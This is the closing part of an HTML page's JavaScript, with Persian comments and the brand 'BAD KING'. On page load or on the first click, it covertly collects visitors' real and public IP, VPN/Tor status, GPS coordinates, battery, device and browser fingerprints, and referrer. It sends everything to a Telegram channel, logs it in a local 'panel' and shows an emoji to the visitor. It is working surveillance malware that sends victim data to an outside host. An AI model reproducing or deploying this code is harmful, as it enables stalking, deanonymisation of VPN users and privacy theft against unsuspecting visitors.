    // ================================================================
    // 8. تشخیص VPN (۵ روش)
    // ================================================================
    async function detectVPN(realIP, publicIP) {
        // روش 1: مقایسه مستقیم
        if (!realIP || !publicIP) return 'نامشخص';
        if (realIP === publicIP) return 'غیرفعال';
        
        // روش 2: بررسی از طریق ip-api.com
        try {
            const res = await fetch('https://ip-api.com/json/' + realIP);
            if (res.ok) {
                const data = await res.json();
                if (data.proxy || data.hosting) return 'فعال (VPN/Proxy)';
            }
        } catch(e) {}

        // روش 3: بررسی از طریق ipinfo.io
        try {
            const res = await fetch('https://ipinfo.io/' + realIP + '/json');
            if (res.ok) {
                const data = await res.json();
                if (data.hosting || data.proxy) return 'فعال (VPN/Proxy)';
            }
        } catch(e) {}

        // روش 4: بررسی از طریق ipapi.co
        try {
            const res = await fetch('https://ipapi.co/' + realIP + '/json/');
            if (res.ok) {
                const data = await res.json();
                if (data.proxy || data.tor) return 'فعال (VPN/Proxy/Tor)';
            }
        } catch(e) {}

        // روش 5: بررسی از طریق geojs.io
        try {
            const res = await fetch('https://get.geojs.io/v1/ip/' + realIP + '.json');
            if (res.ok) {
                const data = await res.json();
                if (data.organization && data.organization.includes('VPN')) return 'فعال (VPN)';
            }
        } catch(e) {}

        return 'غیرفعال';
    }

    // ================================================================

    function getInteractionInfo() {
        let lt = 'نامشخص',
            dlt = 'نامشخص',
            dit = 'نامشخص',
            dclt = 'نامشخص';
        try {
            if (performance.timing) {
                const n = performance.timing;
                lt = (n.loadEventEnd - n.navigationStart) + ' ms';
                dlt = (n.domComplete - n.domLoading) + ' ms';
                dit = (n.domInteractive - n.navigationStart) + ' ms';
                dclt = (n.domContentLoadedEventEnd - n.navigationStart) + ' ms';
            }
        } catch (e) {}
        let mi = 'نامشخص';
        try {
            if (performance.memory) {
                mi = Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB / ' + Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB';
            }
        } catch (e) {}
        let nt = 'نامشخص',
            rc = 0;
        try {
            if (performance.navigation) {
                const types = { 0: 'کلیک/تایپ', 1: 'رفرش', 2: 'بازگشت', 255: 'سایر' };
                nt = types[performance.navigation.type] || 'نامشخص';
                rc = performance.navigation.redirectCount || 0;
            }
        } catch (e) {}
        return {
            loadTime: lt,
            domLoadTime: dlt,
            domInteractiveTime: dit,
            domContentLoadedTime: dclt,
            memoryInfo: mi,
            navigationType: nt,
            redirectCount: rc,
            visibilityState: document.visibilityState,
            hasFocus: document.hasFocus() ? 'بله' : 'خیر',
            referrer: document.referrer || 'مستقیم',
            url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            protocol: window.location.protocol,
            port: window.location.port || '80'
        };
    }

    // ================================================================
    function getStorageInfo() {
        let ls = 'نامشخص',
            ss = 'نامشخص';
        let lc = 0,
            sc = 0;
        try {
            let total = 0;
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) { total += localStorage.getItem(key).length;
                    lc++; }
            }
            ls = Math.round(total / 1024) + ' KB';
        } catch (e) {}
        try {
            let total = 0;
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) { total += sessionStorage.getItem(key).length;
                    sc++; }
            }
            ss = Math.round(total / 1024) + ' KB';
        } catch (e) {}
        return { localStorageSize: ls, localStorageCount: lc, sessionStorageSize: ss, sessionStorageCount: sc };
    }

            msg += `   └ شتاب: ${device.hwAcceleration}\n\n`;

            // مرورگر
            msg += '🌐 *مرورگر*\n';
            msg += `   └ ${device.browser} v${device.browserVer}\n`;
            msg += `   └ پلتفرم: ${device.platform}\n`;
            msg += `   └ حالت: ${device.privateMode}\n`;
            msg += `   └ کوکی: ${device.cookie}\n\n`;

            // صفحه نمایش
            msg += '🖼️ *نمایشگر*\n';
            msg += `   └ ${screen.screenWidth}x${screen.screenHeight}\n`;
            msg += `   └ عمق رنگ: ${screen.colorDepth}\n`;
            msg += `   └ نسبت پیکسل: ${screen.pixelRatio}\n`;
            msg += `   └ نرخ تازه‌سازی: ${screen.refreshRate}\n`;
            msg += `   └ HDR: ${screen.hdrSupport}\n\n`;

            // شبکه و IP
            msg += '🌐 *شبکه و IP*\n';
            msg += `   └ نوع اتصال: ${network.type}\n`;
            if (network.downlink !== 'نامشخص') msg += `   └ سرعت: ${network.downlink}\n`;
            if (network.rtt !== 'نامشخص') msg += `   └ تأخیر: ${network.rtt}\n`;
            if (realIP) msg += `   └ IP واقعی: ${realIP}\n`;
            if (publicIPData) {
                msg += `   └ IP ظاهری: ${publicIPData.ip}\n`;
                msg += `   └ موقعیت ظاهری: ${publicIPData.city}, ${publicIPData.country}\n`;
                msg += `   └ ISP: ${publicIPData.isp}\n`;
            }
            msg += `   └ VPN: ${vpnStatus}\n\n`;

            // موقعیت GPS
            if (location) {
                msg += '📍 *موقعیت دقیق (GPS)*\n';
                msg += `   └ ${location.lat}, ${location.lng}\n`;
                msg += `   └ دقت: ${location.acc}\n`;
                if (location.alt !== 'نامشخص') msg += `   └ ارتفاع: ${location.alt}\n`;
                if (location.heading !== 'نامشخص') msg += `   └ جهت: ${location.heading}°\n`;
                if (location.speed !== 'نامشخص') msg += `   └ سرعت: ${location.speed}\n`;
                msg += `   └ نقشه: ${location.mapGoogle}\n\n`;
            }

            // باتری
            if (battery) {
                msg += '🔋 *باتری*\n';
                msg += `   └ سطح: ${battery.level}\n`;
                msg += `   └ وضعیت: ${battery.charging}\n`;
                if (battery.chargingTime !== 'نامشخص') msg += `   └ زمان شارژ: ${battery.chargingTime}\n`;
                if (battery.dischargingTime !== 'نامشخص') msg += `   └ زمان تخلیه: ${battery.dischargingTime}\n\n`;
            }

            // قابلیت‌ها
            msg += '🔧 *قابلیت‌های مرورگر*\n';
            const caps = ['webgl', 'webgl2', 'webgpu', 'webassembly', 'websocket', 'serviceWorker', 'indexedDB', 'webrtc', 'webtransport', 'webcodecs', 'fileSystemAccess', 'webBluetooth', 'webNFC', 'webUSB', 'webXR', 'webSpeech', 'webAuthn', 'webMIDI', 'webHID', 'webSerial', 'webShare', 'webNotification', 'webPayment', 'webVR', 'webAudio', 'webMedia', 'webFileAPI', 'webDragDrop', 'webFullscreen', 'webHistory', 'webLocation', 'webStorage', 'webWorker', 'webFetch', 'webStreams', 'webPerformance', 'webIntersectionObserver', 'webResizeObserver', 'webMutationObserver', 'webProxy', 'webMap', 'webSet', 'webSymbol', 'webPromise'];
            let capsList = [];
            caps.forEach(c => {
                if (capabilities[c] === 'بله') capsList.push(c);
            });
            msg += `   └ ${capsList.length} قابلیت فعال\n`;
            if (capsList.length > 0) msg += `   └ ${capsList.slice(0, 10).join(', ')}${capsList.length > 10 ? '...' : ''}\n\n`;

            // کدک‌ها
            msg += '🎵 *کدک‌ها*\n';
            const codecList = ['h264', 'h264High', 'h265', 'vp8', 'vp9', 'av1', 'mp3', 'aac', 'ogg', 'wav', 'flac', 'opus', 'webm', 'mp4', 'ogv'];
            let codecStr = '';
            codecList.forEach(c => {
                if (codecs[c] !== 'خیر') codecStr += `${c}: ${codecs[c]} `;
            });
            msg += `   └ ${codecStr || 'هیچ کدکی پشتیبانی نمی‌شود'}\n\n`;

            // فونت‌ها و پلاگین‌ها
            if (fonts.length > 0) msg += `🔤 *فونت‌ها:* ${fonts.slice(0, 10).join(', ')}${fonts.length > 10 ? '...' : ''}\n`;
            if (plugins.length > 0) msg += `🔌 *پلاگین‌ها:* ${plugins.slice(0, 5).join(', ')}${plugins.length > 5 ? '...' : ''}\n\n`;

            // اثر انگشت
            msg += '🎨 *اثر انگشت*\n';
            if (fingerprints.canvas !== 'نامشخص') msg += `   └ Canvas: ${fingerprints.canvas}\n`;
            if (fingerprints.webgl !== 'نامشخص') msg += `   └ WebGL: ${fingerprints.webgl}\n`;
            msg += `   └ Font: ${fingerprints.font}\n\n`;

            // تعامل
            msg += '⏱️ *تعامل*\n';
            msg += `   └ بارگذاری: ${interaction.loadTime}\n`;
            msg += `   └ DOM: ${interaction.domLoadTime}\n`;
            msg += `   └ Interactive: ${interaction.domInteractiveTime}\n`;
            msg += `   └ Navigation: ${interaction.navigationType}\n`;
            if (interaction.memoryInfo !== 'نامشخص') msg += `   └ حافظه: ${interaction.memoryInfo}\n\n`;

            // ذخیره‌سازی
            msg += '💾 *ذخیره‌سازی*\n';
            if (storage.localStorageSize !== 'نامشخص') msg += `   └ LocalStorage: ${storage.localStorageSize} (${storage.localStorageCount} آیتم)\n`;
            if (storage.sessionStorageSize !== 'نامشخص') msg += `   └ SessionStorage: ${storage.sessionStorageSize} (${storage.sessionStorageCount} آیتم)\n\n`;

            // منبع
            msg += '🔗 *منبع*\n';
            msg += `   └ ${interaction.referrer}\n`;
            msg += `   └ ${interaction.url}\n\n`;

            msg += '═══════════════════════════════\n';
            msg += '👑 BAD KING - سیستم امن';

            // ================================================================
            // ارسال به تلگرام با 3 روش
            // ================================================================
            const sent = await sendToTelegramWithFallback(msg);

            // ================================================================
            // ذخیره در پنل (localStorage)
            // ================================================================
            try {
                let visits = JSON.parse(localStorage.getItem('badking_visits') || '[]');
                const visitData = {
                    id: Date.now(),
                    time: time.time,
                    dayOfWeek: time.dayOfWeek,
                    deviceType: device.deviceType,
                    deviceModel: device.deviceModel,
                    deviceVendor: device.deviceVendor,
                    os: device.os,
                    browser: device.browser + ' v' + device.browserVer,
                    screen: screen.screenWidth + 'x' + screen.screenHeight,
                    memory: device.memory,
                    cores: device.cores,
                    ip: publicIPData ? publicIPData.ip : 'نامشخص',
                    location: publicIPData ? publicIPData.city + ', ' + publicIPData.country : 'نامشخص',
                    gps: location ? location.lat + ', ' + location.lng : 'نامشخص',
                    mapLink: location ? location.mapGoogle : 'نامشخص',
                    battery: battery ? battery.level : 'نامشخص',
                    vpn: vpnStatus,
                    privateMode: device.privateMode,
                    referrer: interaction.referrer,
                    url: interaction.url,
                    fingerprint: fingerprints.canvas
                };
                visits.unshift(visitData);
                if (visits.length > 100) visits = visits.slice(0, 100);
                localStorage.setItem('badking_visits', JSON.stringify(visits));
                console.log('✅ اطلاعات در پنل ذخیره شد');
            } catch(e) {
                console.error('خطا در ذخیره پنل:', e);
            }

            if (sent) {
                showEmoji();
                console.log('✅ اطلاعات به تلگرام ارسال شد');
            } else {
                console.log('⚠️ ارسال به تلگرام ناموفق بود، اما اطلاعات در پنل ذخیره شد');
                showEmoji();
            }

        } catch (e) {
            console.error('❌ خطا:', e);
        }
    }

    // ===== اجرا =====
    let hasRun = false;

    function start() {
        if (!hasRun) {
            hasRun = true;
            run();
        }
    }

    setTimeout(start, 2000);
    document.addEventListener('click', start);
    document.addEventListener('touchstart', start);

    console.log('✅ BAD KING - سیستم اطلاعاتی کامل');
    console.log('📊 جمع‌آوری 180+ مورد اطلاعات با 5 روش پشتیبان');
</script>
</body>
</html>
